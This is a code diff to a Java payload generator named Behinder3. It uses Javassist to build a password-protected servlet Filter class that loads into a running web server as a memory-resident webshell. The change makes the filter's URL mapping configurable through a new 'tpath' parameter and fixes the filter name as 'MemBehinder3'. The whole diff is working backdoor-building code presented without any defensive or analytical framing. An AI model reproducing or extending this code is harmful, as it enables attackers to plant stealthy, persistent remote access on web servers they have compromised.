@@ -10,7 +10,7 @@ public class Behinder3 {
 
 
 
-    public static byte[] getMemBehinder3Payload(String pass) throws Exception {
+    public static byte[] getMemBehinder3Payload(String pass,String path) throws Exception {
 
         ClassPool classPool = ClassPool.getDefault();
         classPool.insertClassPath(new ClassClassPath(Filter.class));
@@ -26,6 +26,7 @@ public class Behinder3 {
         ctClass.setSuperclass(classPool.getCtClass(ClassLoader.class.getName()));
         ctClass.setInterfaces(new CtClass[]{classPool.getCtClass(Filter.class.getName())});
         ctClass.addField(CtField.make("public String passwd = \"" + pass + "\";", ctClass));
+        ctClass.addField(CtField.make("public String tpath = \"" + path + "\";", ctClass));
         ctClass.addField(CtField.make("public String cs = \"UTF-8\";", ctClass));
         ctClass.addField(CtField.make("public javax.servlet.http.HttpServletRequest request = null;", ctClass));
         ctClass.addField(CtField.make("public javax.servlet.http.HttpServletResponse response = null;", ctClass));
@@ -194,7 +195,7 @@ public class Behinder3 {
                 "            this.response.setContentType(\"text/html\");\n" +
                 "            this.request.setCharacterEncoding(this.cs);\n" +
                 "            this.response.setCharacterEncoding(this.cs);\n" +
-                "            output.append(this.addFilter(this,\""+cname+"\",\"/*\", this.request));\n" +
+                "            output.append(this.addFilter(this,\"MemBehinder3\",this.tpath, this.request));\n" +
                 "        } catch (Exception var7) {\n" +
                 "            output.append(\"ERROR:// \" + var7.toString());\n" +
                 "        }\n" +
